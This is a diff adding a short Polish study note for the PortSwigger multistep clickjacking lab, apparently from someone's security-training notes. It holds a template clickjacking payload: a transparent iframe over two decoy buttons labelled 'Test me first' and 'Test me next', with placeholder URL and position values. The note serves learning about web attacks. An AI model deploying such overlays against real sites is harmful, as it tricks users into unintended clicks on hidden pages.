@@ -1,0 +1,26 @@
+Przyklad z podwojnym kliknieciem, nic wielkiego poprostu dochodzi kolejny przycisk
+(https://portswigger.net/web-security/clickjacking/lab-multistep)
+
+
+<style>
+	iframe {
+		position:relative;
+		width:$width_value;
+		height: $height_value;
+		opacity: $opacity;
+		z-index: 2;
+	}
+   .firstClick, .secondClick {
+		position:absolute;
+		top:$top_value1;
+		left:$side_value1;
+		z-index: 1;
+	}
+   .secondClick {
+		top:$top_value2;
+		left:$side_value2;
+	}
+</style>
+<div class="firstClick">Test me first</div>
+<div class="secondClick">Test me next</div>
+<iframe src="$url"></iframe>
